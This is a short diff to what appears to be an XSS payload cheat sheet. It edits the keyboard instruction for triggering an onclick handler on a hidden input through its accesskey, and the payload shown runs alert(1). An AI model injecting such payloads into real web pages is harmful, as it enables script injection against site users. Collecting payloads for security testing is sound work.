@@ -134,7 +134,7 @@ XSS in Hidden input
 
 ```javascript
 <input type="hidden" accesskey="X" onclick="alert(1)">
-Use CTRL+SHIFT+X to trigger the onclick event
+Use ALT+SHIFT+X to trigger the onclick event,test in firefox
 ```
 
 DOM XSS
